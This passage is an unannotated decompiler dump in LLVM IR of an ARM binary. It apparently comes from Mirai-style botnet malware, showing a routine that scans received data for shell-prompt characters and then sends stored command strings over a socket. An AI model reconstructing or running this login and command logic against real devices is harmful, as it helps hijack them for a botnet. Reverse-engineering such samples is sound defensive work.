  %v3_f020 = load i8, i8* %v2_f020, align 1
  %v4_f020 = zext i8 %v3_f020 to i32
  store i32 %v4_f020, i32* %r3.global-to-local, align 4
  %v2_f024 = icmp ugt i8 %v3_f020, 61
  store i1 %v2_f024, i1* %cpsr_c.global-to-local, align 1
  %v7_f024 = icmp eq i8 %v3_f020, 62
  store i1 %v7_f024, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f024, label %dec_label_pc_f088, label %bb436

bb436:                                            ; preds = %dec_label_pc_f01c
  %v3_f028 = icmp ugt i8 %v3_f020, 57
  store i1 %v3_f028, i1* %cpsr_c.global-to-local, align 1
  %v8_f028 = icmp eq i8 %v3_f020, 58
  store i1 %v8_f028, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f028, label %dec_label_pc_f088, label %dec_label_pc_f030

dec_label_pc_f030:                                ; preds = %bb436
  %v2_f030 = icmp ugt i8 %v3_f020, 35
  store i1 %v2_f030, i1* %cpsr_c.global-to-local, align 1
  %v7_f030 = icmp eq i8 %v3_f020, 36
  store i1 %v7_f030, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f030, label %dec_label_pc_f088, label %dec_label_pc_f038

dec_label_pc_f038:                                ; preds = %dec_label_pc_f030
  %v2_f038 = icmp ugt i8 %v3_f020, 34
  store i1 %v2_f038, i1* %cpsr_c.global-to-local, align 1
  %v7_f038 = icmp eq i8 %v3_f020, 35
  store i1 %v7_f038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f038, label %dec_label_pc_f088, label %dec_label_pc_f040

dec_label_pc_f040:                                ; preds = %dec_label_pc_f038
  %v2_f040 = icmp ugt i8 %v3_f020, 36
  store i1 %v2_f040, i1* %cpsr_c.global-to-local, align 1
  %v7_f040 = icmp eq i8 %v3_f020, 37
  store i1 %v7_f040, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f040, label %dec_label_pc_f088, label %dec_label_pc_f070.preheader

dec_label_pc_f070.preheader:                      ; preds = %dec_label_pc_f040
  %v3_f044 = add i32 %v0_ec50, 28
  %v2_f048 = add i32 %v3_f044, %v3_f00c
  store i32 %v2_f048, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f070

dec_label_pc_f054:                                ; preds = %bb437
  %v2_f054 = icmp ugt i8 %v3_f078, 35
  store i1 %v2_f054, i1* %cpsr_c.global-to-local, align 1
  %v7_f054 = icmp eq i8 %v3_f078, 36
  store i1 %v7_f054, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f054, label %dec_label_pc_f088, label %dec_label_pc_f05c

dec_label_pc_f05c:                                ; preds = %dec_label_pc_f054
  %v2_f05c = icmp ugt i8 %v3_f078, 34
  store i1 %v2_f05c, i1* %cpsr_c.global-to-local, align 1
  %v7_f05c = icmp eq i8 %v3_f078, 35
  store i1 %v7_f05c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f05c, label %dec_label_pc_f088, label %dec_label_pc_f064

dec_label_pc_f064:                                ; preds = %dec_label_pc_f05c
  %v2_f064 = icmp ugt i8 %v3_f078, 36
  store i1 %v2_f064, i1* %cpsr_c.global-to-local, align 1
  %v7_f064 = icmp eq i8 %v3_f078, 37
  store i1 %v7_f064, i1* %cpsr_z.global-to-local, align 1
  %v1_f068 = add i32 %v0_f068, -1
  store i32 %v1_f068, i32* %r3.global-to-local, align 4
  br i1 %v7_f064, label %dec_label_pc_f088, label %dec_label_pc_f070

dec_label_pc_f070:                                ; preds = %dec_label_pc_f070.preheader, %dec_label_pc_f064
  %v0_f068 = phi i32 [ %v2_f048, %dec_label_pc_f070.preheader ], [ %v1_f068, %dec_label_pc_f064 ]
  %v0_f070 = phi i32 [ %v1_f010, %dec_label_pc_f070.preheader ], [ %v1_f070, %dec_label_pc_f064 ]
  %v1_f070 = add i32 %v0_f070, -1
  store i32 %v1_f070, i32* %r1.global-to-local, align 4
  %v2_f070 = icmp ne i32 %v0_f070, 0
  store i1 %v2_f070, i1* %cpsr_c.global-to-local, align 1
  %v7_f070 = icmp eq i32 %v0_f070, 1
  store i1 %v7_f070, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f070, label %dec_label_pc_ebd4.backedge.thread559, label %dec_label_pc_f078

dec_label_pc_f078:                                ; preds = %dec_label_pc_f070
  %v1_f078 = add i32 %v0_f068, -2
  %v2_f078 = inttoptr i32 %v1_f078 to i8*
  %v3_f078 = load i8, i8* %v2_f078, align 1
  %v4_f078 = zext i8 %v3_f078 to i32
  store i32 %v4_f078, i32* %r2.global-to-local, align 4
  %v2_f07c = icmp ugt i8 %v3_f078, 61
  store i1 %v2_f07c, i1* %cpsr_c.global-to-local, align 1
  %v7_f07c = icmp eq i8 %v3_f078, 62
  store i1 %v7_f07c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f07c, label %dec_label_pc_f088, label %bb437

bb437:                                            ; preds = %dec_label_pc_f078
  %v3_f080 = icmp ugt i8 %v3_f078, 57
  store i1 %v3_f080, i1* %cpsr_c.global-to-local, align 1
  %v8_f080 = icmp eq i8 %v3_f078, 58
  store i1 %v8_f080, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f080, label %dec_label_pc_f088, label %dec_label_pc_f054

dec_label_pc_f088:                                ; preds = %dec_label_pc_f078, %bb437, %dec_label_pc_f064, %dec_label_pc_f05c, %dec_label_pc_f054, %dec_label_pc_f040, %dec_label_pc_f01c, %dec_label_pc_f038, %dec_label_pc_f030, %bb436
  %v0_f08c = phi i32 [ %v1_f010, %dec_label_pc_f040 ], [ %v1_f010, %dec_label_pc_f01c ], [ %v1_f010, %dec_label_pc_f038 ], [ %v1_f010, %dec_label_pc_f030 ], [ %v1_f010, %bb436 ], [ %v1_f070, %dec_label_pc_f054 ], [ %v1_f070, %dec_label_pc_f05c ], [ %v1_f070, %dec_label_pc_f064 ], [ %v1_f070, %bb437 ], [ %v1_f070, %dec_label_pc_f078 ]
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_f08c = add i32 %v0_f08c, 1
  store i32 %v1_f08c, i32* @r7, align 4
  %v1_f090 = call i32 @table_unlock_val(i32 6)
  store i32 %v2_f484, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v3_f0a0 = call i32 @table_retrieve_val(i32 6, i32* nonnull %stack_var_-60)
  store i32 %v3_f0a0, i32* %r0.global-to-local, align 4
  %v3_f0a4 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f0a4, i32* %r2.global-to-local, align 4
  store i32 %v3_f0a0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f0b0 = load i32, i32* @r6, align 4
  %v1_f0b0 = add i32 %v0_f0b0, 4
  %v2_f0b0 = inttoptr i32 %v1_f0b0 to i32*
  %v3_f0b0 = load i32, i32* %v2_f0b0, align 4
  store i32 %v3_f0b0, i32* %r0.global-to-local, align 4
  %v4_f0b4 = call i32 @__libc_send(i32 %v3_f0b0, i32 %v3_f0a0, i32 %v3_f0a4, i32 16384)
  store i32 %v4_f0b4, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18e10.199 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f0c4 = load i32, i32* @r6, align 4
  %v1_f0c4 = add i32 %v0_f0c4, 4
  %v2_f0c4 = inttoptr i32 %v1_f0c4 to i32*
  %v3_f0c4 = load i32, i32* %v2_f0c4, align 4
  store i32 %v3_f0c4, i32* %r0.global-to-local, align 4
  %v4_f0c8 = call i32 @__libc_send(i32 %v3_f0c4, i32 ptrtoint ([3 x i8]* @global_var_18e10.199 to i32), i32 2, i32 16384)
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_f0d0 = call i32 @table_lock_val(i32 6)
  store i32 %v1_f0d0, i32* %r0.global-to-local, align 4
  store i32 7, i32* @r3, align 4
  %v1_f0d8 = load i32, i32* @r6, align 4
  %v2_f0d8 = add i32 %v1_f0d8, 12
  %v3_f0d8 = inttoptr i32 %v2_f0d8 to i32*
  store i32 7, i32* %v3_f0d8, align 4
  br label %dec_label_pc_ed6c

dec_label_pc_f0e0:                                ; preds = %dec_label_pc_ec50
  %v1_f0e0 = add i32 %v0_ec50, 24
  %v2_f0e0 = inttoptr i32 %v1_f0e0 to i32*
  %v3_f0e0 = load i32, i32* %v2_f0e0, align 4
  store i32 %v3_f0e0, i32* %r2.global-to-local, align 4
  %v1_f0e4 = add i32 %v3_f0e0, -1
  store i32 %v1_f0e4, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f0e8 = icmp eq i32 %v1_f0e4, 0
  store i1 %v2_f0e8, i1* %cpsr_z.global-to-local, align 1
  %tmp438 = icmp slt i32 %v1_f0e4, 1
  br i1 %tmp438, label %dec_label_pc_ebd4.backedge.thread, label %dec_label_pc_f0f0

dec_label_pc_f0f0:                                ; preds = %dec_label_pc_f0e0
  %v2_f0f0 = add i32 %v1_f0e4, %v0_ec50
  store i32 %v2_f0f0, i32* %r3.global-to-local, align 4
  %v1_f0f4 = add i32 %v2_f0f0, 28
  %v2_f0f4 = inttoptr i32 %v1_f0f4 to i8*
  %v3_f0f4 = load i8, i8* %v2_f0f4, align 1
  %v4_f0f4 = zext i8 %v3_f0f4 to i32
  store i32 %v4_f0f4, i32* %r3.global-to-local, align 4
  %v2_f0f8 = icmp ugt i8 %v3_f0f4, 61
  store i1 %v2_f0f8, i1* %cpsr_c.global-to-local, align 1
  %v7_f0f8 = icmp eq i8 %v3_f0f4, 62
  store i1 %v7_f0f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f0f8, label %dec_label_pc_f15c, label %bb439

bb439:                                            ; preds = %dec_label_pc_f0f0
  %v3_f0fc = icmp ugt i8 %v3_f0f4, 57
  store i1 %v3_f0fc, i1* %cpsr_c.global-to-local, align 1
  %v8_f0fc = icmp eq i8 %v3_f0f4, 58
  store i1 %v8_f0fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f0fc, label %dec_label_pc_f15c, label %dec_label_pc_f104

dec_label_pc_f104:                                ; preds = %bb439
  %v2_f104 = icmp ugt i8 %v3_f0f4, 35
  store i1 %v2_f104, i1* %cpsr_c.global-to-local, align 1
  %v7_f104 = icmp eq i8 %v3_f0f4, 36
  store i1 %v7_f104, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f104, label %dec_label_pc_f15c, label %dec_label_pc_f10c

dec_label_pc_f10c:                                ; preds = %dec_label_pc_f104
  %v2_f10c = icmp ugt i8 %v3_f0f4, 34
  store i1 %v2_f10c, i1* %cpsr_c.global-to-local, align 1
  %v7_f10c = icmp eq i8 %v3_f0f4, 35
  store i1 %v7_f10c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f10c, label %dec_label_pc_f15c, label %dec_label_pc_f114

dec_label_pc_f114:                                ; preds = %dec_label_pc_f10c
  %v2_f114 = icmp ugt i8 %v3_f0f4, 36
  store i1 %v2_f114, i1* %cpsr_c.global-to-local, align 1
  %v7_f114 = icmp eq i8 %v3_f0f4, 37
  store i1 %v7_f114, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f114, label %dec_label_pc_f15c, label %dec_label_pc_f144.preheader

dec_label_pc_f144.preheader:                      ; preds = %dec_label_pc_f114
  %v3_f118 = add i32 %v0_ec50, 28
  %v2_f11c = add i32 %v3_f118, %v3_f0e0
  store i32 %v2_f11c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f144

dec_label_pc_f128:                                ; preds = %bb440
  %v2_f128 = icmp ugt i8 %v3_f14c, 35
  store i1 %v2_f128, i1* %cpsr_c.global-to-local, align 1
  %v7_f128 = icmp eq i8 %v3_f14c, 36
  store i1 %v7_f128, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f128, label %dec_label_pc_f15c, label %dec_label_pc_f130

dec_label_pc_f130:                                ; preds = %dec_label_pc_f128
  %v2_f130 = icmp ugt i8 %v3_f14c, 34
  store i1 %v2_f130, i1* %cpsr_c.global-to-local, align 1
  %v7_f130 = icmp eq i8 %v3_f14c, 35
  store i1 %v7_f130, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f130, label %dec_label_pc_f15c, label %dec_label_pc_f138

dec_label_pc_f138:                                ; preds = %dec_label_pc_f130
  %v2_f138 = icmp ugt i8 %v3_f14c, 36
  store i1 %v2_f138, i1* %cpsr_c.global-to-local, align 1
  %v7_f138 = icmp eq i8 %v3_f14c, 37
  store i1 %v7_f138, i1* %cpsr_z.global-to-local, align 1
  %v1_f13c = add i32 %v0_f13c, -1
  store i32 %v1_f13c, i32* %r3.global-to-local, align 4
  br i1 %v7_f138, label %dec_label_pc_f15c, label %dec_label_pc_f144

dec_label_pc_f144:                                ; preds = %dec_label_pc_f144.preheader, %dec_label_pc_f138
  %v0_f13c = phi i32 [ %v2_f11c, %dec_label_pc_f144.preheader ], [ %v1_f13c, %dec_label_pc_f138 ]
  %v0_f144 = phi i32 [ %v1_f0e4, %dec_label_pc_f144.preheader ], [ %v1_f144, %dec_label_pc_f138 ]
  %v1_f144 = add i32 %v0_f144, -1
  store i32 %v1_f144, i32* %r1.global-to-local, align 4
  %v2_f144 = icmp ne i32 %v0_f144, 0
  store i1 %v2_f144, i1* %cpsr_c.global-to-local, align 1
  %v7_f144 = icmp eq i32 %v0_f144, 1
  store i1 %v7_f144, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f144, label %dec_label_pc_ebd4.backedge.thread559, label %dec_label_pc_f14c

dec_label_pc_f14c:                                ; preds = %dec_label_pc_f144
  %v1_f14c = add i32 %v0_f13c, -2
  %v2_f14c = inttoptr i32 %v1_f14c to i8*
  %v3_f14c = load i8, i8* %v2_f14c, align 1
  %v4_f14c = zext i8 %v3_f14c to i32
  store i32 %v4_f14c, i32* %r2.global-to-local, align 4
  %v2_f150 = icmp ugt i8 %v3_f14c, 61
  store i1 %v2_f150, i1* %cpsr_c.global-to-local, align 1
  %v7_f150 = icmp eq i8 %v3_f14c, 62
  store i1 %v7_f150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f150, label %dec_label_pc_f15c, label %bb440

bb440:                                            ; preds = %dec_label_pc_f14c
  %v3_f154 = icmp ugt i8 %v3_f14c, 57
  store i1 %v3_f154, i1* %cpsr_c.global-to-local, align 1
  %v8_f154 = icmp eq i8 %v3_f14c, 58
  store i1 %v8_f154, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f154, label %dec_label_pc_f15c, label %dec_label_pc_f128

dec_label_pc_f15c:                                ; preds = %dec_label_pc_f14c, %bb440, %dec_label_pc_f138, %dec_label_pc_f130, %dec_label_pc_f128, %dec_label_pc_f114, %dec_label_pc_f0f0, %dec_label_pc_f10c, %dec_label_pc_f104, %bb439
  %v0_f160 = phi i32 [ %v1_f0e4, %dec_label_pc_f114 ], [ %v1_f0e4, %dec_label_pc_f0f0 ], [ %v1_f0e4, %dec_label_pc_f10c ], [ %v1_f0e4, %dec_label_pc_f104 ], [ %v1_f0e4, %bb439 ], [ %v1_f144, %dec_label_pc_f128 ], [ %v1_f144, %dec_label_pc_f130 ], [ %v1_f144, %dec_label_pc_f138 ], [ %v1_f144, %bb440 ], [ %v1_f144, %dec_label_pc_f14c ]
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_f160 = add i32 %v0_f160, 1
  store i32 %v1_f160, i32* @r7, align 4
  %v1_f164 = call i32 @table_unlock_val(i32 5)
  store i32 %v2_f484, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  %v3_f174 = call i32 @table_retrieve_val(i32 5, i32* nonnull %stack_var_-60)
  store i32 %v3_f174, i32* %r0.global-to-local, align 4
  %v3_f178 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f178, i32* %r2.global-to-local, align 4
  store i32 %v3_f174, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f184 = load i32, i32* @r6, align 4
  %v1_f184 = add i32 %v0_f184, 4
  %v2_f184 = inttoptr i32 %v1_f184 to i32*
  %v3_f184 = load i32, i32* %v2_f184, align 4
  store i32 %v3_f184, i32* %r0.global-to-local, align 4
  %v4_f188 = call i32 @__libc_send(i32 %v3_f184, i32 %v3_f174, i32 %v3_f178, i32 16384)
  store i32 %v4_f188, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18e10.199 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f198 = load i32, i32* @r6, align 4
  %v1_f198 = add i32 %v0_f198, 4
  %v2_f198 = inttoptr i32 %v1_f198 to i32*
  %v3_f198 = load i32, i32* %v2_f198, align 4
  store i32 %v3_f198, i32* %r0.global-to-local, align 4
  %v4_f19c = call i32 @__libc_send(i32 %v3_f198, i32 ptrtoint ([3 x i8]* @global_var_18e10.199 to i32), i32 2, i32 16384)
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_f1a4 = call i32 @table_lock_val(i32 5)
  store i32 %v1_f1a4, i32* %r0.global-to-local, align 4
  store i32 6, i32* @r3, align 4
  %v1_f1ac = load i32, i32* @r6, align 4
  %v2_f1ac = add i32 %v1_f1ac, 12
  %v3_f1ac = inttoptr i32 %v2_f1ac to i32*
  store i32 6, i32* %v3_f1ac, align 4
  br label %dec_label_pc_ed6c

dec_label_pc_f22c:                                ; preds = %dec_label_pc_ec50
  %v1_f22c = add i32 %v0_ec50, 24
  %v2_f22c = inttoptr i32 %v1_f22c to i32*
  %v3_f22c = load i32, i32* %v2_f22c, align 4
  store i32 %v3_f22c, i32* %r2.global-to-local, align 4
  %v1_f230 = add i32 %v3_f22c, -1
  store i32 %v1_f230, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f234 = icmp eq i32 %v1_f230, 0
  store i1 %v2_f234, i1* %cpsr_z.global-to-local, align 1
  %tmp441 = icmp slt i32 %v1_f230, 1
  br i1 %tmp441, label %dec_label_pc_ebd4.backedge.thread, label %dec_label_pc_f23c

dec_label_pc_f23c:                                ; preds = %dec_label_pc_f22c
  %v2_f23c = add i32 %v1_f230, %v0_ec50
  store i32 %v2_f23c, i32* %r3.global-to-local, align 4
  %v1_f240 = add i32 %v2_f23c, 28
  %v2_f240 = inttoptr i32 %v1_f240 to i8*
  %v3_f240 = load i8, i8* %v2_f240, align 1
  %v4_f240 = zext i8 %v3_f240 to i32
  store i32 %v4_f240, i32* %r3.global-to-local, align 4
  %v2_f244 = icmp ugt i8 %v3_f240, 61
  store i1 %v2_f244, i1* %cpsr_c.global-to-local, align 1
  %v7_f244 = icmp eq i8 %v3_f240, 62
  store i1 %v7_f244, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f244, label %dec_label_pc_f2a8, label %bb442

bb442:                                            ; preds = %dec_label_pc_f23c
  %v3_f248 = icmp ugt i8 %v3_f240, 57
  store i1 %v3_f248, i1* %cpsr_c.global-to-local, align 1
  %v8_f248 = icmp eq i8 %v3_f240, 58
  store i1 %v8_f248, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f248, label %dec_label_pc_f2a8, label %dec_label_pc_f250

dec_label_pc_f250:                                ; preds = %bb442
  %v2_f250 = icmp ugt i8 %v3_f240, 35
  store i1 %v2_f250, i1* %cpsr_c.global-to-local, align 1
  %v7_f250 = icmp eq i8 %v3_f240, 36
  store i1 %v7_f250, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f250, label %dec_label_pc_f2a8, label %dec_label_pc_f258

dec_label_pc_f258:                                ; preds = %dec_label_pc_f250
  %v2_f258 = icmp ugt i8 %v3_f240, 34
  store i1 %v2_f258, i1* %cpsr_c.global-to-local, align 1
  %v7_f258 = icmp eq i8 %v3_f240, 35
  store i1 %v7_f258, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f258, label %dec_label_pc_f2a8, label %dec_label_pc_f260

dec_label_pc_f260:                                ; preds = %dec_label_pc_f258
  %v2_f260 = icmp ugt i8 %v3_f240, 36
  store i1 %v2_f260, i1* %cpsr_c.global-to-local, align 1
  %v7_f260 = icmp eq i8 %v3_f240, 37
  store i1 %v7_f260, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f260, label %dec_label_pc_f2a8, label %dec_label_pc_f290.preheader

dec_label_pc_f290.preheader:                      ; preds = %dec_label_pc_f260
  %v3_f264 = add i32 %v0_ec50, 28
  %v2_f268 = add i32 %v3_f264, %v3_f22c
  store i32 %v2_f268, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f290

dec_label_pc_f274:                                ; preds = %bb443
  %v2_f274 = icmp ugt i8 %v3_f298, 35
  store i1 %v2_f274, i1* %cpsr_c.global-to-local, align 1
  %v7_f274 = icmp eq i8 %v3_f298, 36
  store i1 %v7_f274, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f274, label %dec_label_pc_f2a8, label %dec_label_pc_f27c

dec_label_pc_f27c:                                ; preds = %dec_label_pc_f274
  %v2_f27c = icmp ugt i8 %v3_f298, 34
  store i1 %v2_f27c, i1* %cpsr_c.global-to-local, align 1
  %v7_f27c = icmp eq i8 %v3_f298, 35
  store i1 %v7_f27c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f27c, label %dec_label_pc_f2a8, label %dec_label_pc_f284

dec_label_pc_f284:                                ; preds = %dec_label_pc_f27c
  %v2_f284 = icmp ugt i8 %v3_f298, 36
  store i1 %v2_f284, i1* %cpsr_c.global-to-local, align 1
  %v7_f284 = icmp eq i8 %v3_f298, 37
  store i1 %v7_f284, i1* %cpsr_z.global-to-local, align 1
  %v1_f288 = add i32 %v0_f288, -1
  store i32 %v1_f288, i32* %r3.global-to-local, align 4
  br i1 %v7_f284, label %dec_label_pc_f2a8, label %dec_label_pc_f290

dec_label_pc_f290:                                ; preds = %dec_label_pc_f290.preheader, %dec_label_pc_f284
  %v0_f288 = phi i32 [ %v2_f268, %dec_label_pc_f290.preheader ], [ %v1_f288, %dec_label_pc_f284 ]
  %v0_f290 = phi i32 [ %v1_f230, %dec_label_pc_f290.preheader ], [ %v1_f290, %dec_label_pc_f284 ]
  %v1_f290 = add i32 %v0_f290, -1
  store i32 %v1_f290, i32* %r1.global-to-local, align 4
  %v2_f290 = icmp ne i32 %v0_f290, 0
  store i1 %v2_f290, i1* %cpsr_c.global-to-local, align 1
  %v7_f290 = icmp eq i32 %v0_f290, 1
  store i1 %v7_f290, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f290, label %dec_label_pc_ebd4.backedge.thread559, label %dec_label_pc_f298

dec_label_pc_f298:                                ; preds = %dec_label_pc_f290
  %v1_f298 = add i32 %v0_f288, -2
  %v2_f298 = inttoptr i32 %v1_f298 to i8*
  %v3_f298 = load i8, i8* %v2_f298, align 1
  %v4_f298 = zext i8 %v3_f298 to i32
  store i32 %v4_f298, i32* %r2.global-to-local, align 4
  %v2_f29c = icmp ugt i8 %v3_f298, 61
  store i1 %v2_f29c, i1* %cpsr_c.global-to-local, align 1
  %v7_f29c = icmp eq i8 %v3_f298, 62
  store i1 %v7_f29c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f29c, label %dec_label_pc_f2a8, label %bb443

bb443:                                            ; preds = %dec_label_pc_f298
  %v3_f2a0 = icmp ugt i8 %v3_f298, 57
  store i1 %v3_f2a0, i1* %cpsr_c.global-to-local, align 1
  %v8_f2a0 = icmp eq i8 %v3_f298, 58
  store i1 %v8_f2a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f2a0, label %dec_label_pc_f2a8, label %dec_label_pc_f274

dec_label_pc_f2a8:                                ; preds = %dec_label_pc_f298, %bb443, %dec_label_pc_f284, %dec_label_pc_f27c, %dec_label_pc_f274, %dec_label_pc_f260, %dec_label_pc_f23c, %dec_label_pc_f258, %dec_label_pc_f250, %bb442
  %v0_f2ac = phi i32 [ %v1_f230, %dec_label_pc_f260 ], [ %v1_f230, %dec_label_pc_f23c ], [ %v1_f230, %dec_label_pc_f258 ], [ %v1_f230, %dec_label_pc_f250 ], [ %v1_f230, %bb442 ], [ %v1_f290, %dec_label_pc_f274 ], [ %v1_f290, %dec_label_pc_f27c ], [ %v1_f290, %dec_label_pc_f284 ], [ %v1_f290, %bb443 ], [ %v1_f290, %dec_label_pc_f298 ]
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_f2ac = add i32 %v0_f2ac, 1
  store i32 %v1_f2ac, i32* @r7, align 4
  %v1_f2b0 = call i32 @table_unlock_val(i32 4)
  store i32 %v2_f484, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v3_f2c0 = call i32 @table_retrieve_val(i32 4, i32* nonnull %stack_var_-60)
  store i32 %v3_f2c0, i32* %r0.global-to-local, align 4
  %v3_f2c4 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f2c4, i32* %r2.global-to-local, align 4
  store i32 %v3_f2c0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f2d0 = load i32, i32* @r6, align 4
  %v1_f2d0 = add i32 %v0_f2d0, 4
  %v2_f2d0 = inttoptr i32 %v1_f2d0 to i32*
  %v3_f2d0 = load i32, i32* %v2_f2d0, align 4
  store i32 %v3_f2d0, i32* %r0.global-to-local, align 4
  %v4_f2d4 = call i32 @__libc_send(i32 %v3_f2d0, i32 %v3_f2c0, i32 %v3_f2c4, i32 16384)
  store i32 %v4_f2d4, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18e10.199 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f2e4 = load i32, i32* @r6, align 4
  %v1_f2e4 = add i32 %v0_f2e4, 4
  %v2_f2e4 = inttoptr i32 %v1_f2e4 to i32*
  %v3_f2e4 = load i32, i32* %v2_f2e4, align 4
  store i32 %v3_f2e4, i32* %r0.global-to-local, align 4
  %v4_f2e8 = call i32 @__libc_send(i32 %v3_f2e4, i32 ptrtoint ([3 x i8]* @global_var_18e10.199 to i32), i32 2, i32 16384)
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_f2f0 = call i32 @table_lock_val(i32 4)
  store i32 %v1_f2f0, i32* %r0.global-to-local, align 4
  store i32 8, i32* @r3, align 4
  %v1_f2f8 = load i32, i32* @r6, align 4
  %v2_f2f8 = add i32 %v1_f2f8, 12
  %v3_f2f8 = inttoptr i32 %v2_f2f8 to i32*
  store i32 8, i32* %v3_f2f8, align 4
  br label %dec_label_pc_ed6c

dec_label_pc_f300:                                ; preds = %dec_label_pc_ec50
  %v1_f300 = add i32 %v0_ec50, 24
  %v2_f300 = inttoptr i32 %v1_f300 to i32*
  %v3_f300 = load i32, i32* %v2_f300, align 4
  store i32 %v3_f300, i32* %r2.global-to-local, align 4
  %v1_f304 = add i32 %v3_f300, -1
  store i32 %v1_f304, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f308 = icmp eq i32 %v1_f304, 0
  store i1 %v2_f308, i1* %cpsr_z.global-to-local, align 1
  %tmp444 = icmp slt i32 %v1_f304, 1
  br i1 %tmp444, label %dec_label_pc_f36c, label %dec_label_pc_f310

dec_label_pc_f310:                                ; preds = %dec_label_pc_f300
  %v2_f310 = add i32 %v1_f304, %v0_ec50
  store i32 %v2_f310, i32* %r3.global-to-local, align 4
  %v1_f314 = add i32 %v2_f310, 28
  %v2_f314 = inttoptr i32 %v1_f314 to i8*
  %v3_f314 = load i8, i8* %v2_f314, align 1
  %v4_f314 = zext i8 %v3_f314 to i32
  store i32 %v4_f314, i32* %r3.global-to-local, align 4
  %v2_f318 = icmp ugt i8 %v3_f314, 61
  store i1 %v2_f318, i1* %cpsr_c.global-to-local, align 1
  %v7_f318 = icmp eq i8 %v3_f314, 62
  store i1 %v7_f318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f318, label %dec_label_pc_f5d4, label %bb445

bb445:                                            ; preds = %dec_label_pc_f310
  %v3_f31c = icmp ugt i8 %v3_f314, 57
  store i1 %v3_f31c, i1* %cpsr_c.global-to-local, align 1
  %v8_f31c = icmp eq i8 %v3_f314, 58
  store i1 %v8_f31c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f31c, label %dec_label_pc_f5d4, label %dec_label_pc_f324

dec_label_pc_f324:                                ; preds = %bb445
  %v2_f324 = icmp ugt i8 %v3_f314, 35
  store i1 %v2_f324, i1* %cpsr_c.global-to-local, align 1
  %v7_f324 = icmp eq i8 %v3_f314, 36
  store i1 %v7_f324, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f324, label %dec_label_pc_f5d4, label %dec_label_pc_f32c

dec_label_pc_f32c:                                ; preds = %dec_label_pc_f324
  %v2_f32c = icmp ugt i8 %v3_f314, 34
  store i1 %v2_f32c, i1* %cpsr_c.global-to-local, align 1
  %v7_f32c = icmp eq i8 %v3_f314, 35
  store i1 %v7_f32c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f32c, label %dec_label_pc_f5d4, label %dec_label_pc_f364.preheader

dec_label_pc_f364.preheader:                      ; preds = %dec_label_pc_f32c
  %v3_f330 = add i32 %v0_ec50, 28
  %v2_f334 = add i32 %v3_f330, %v3_f300
  store i32 %v2_f334, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f364

dec_label_pc_f340:                                ; preds = %dec_label_pc_f364
  %v1_f340 = add i32 %v0_f35c, -2
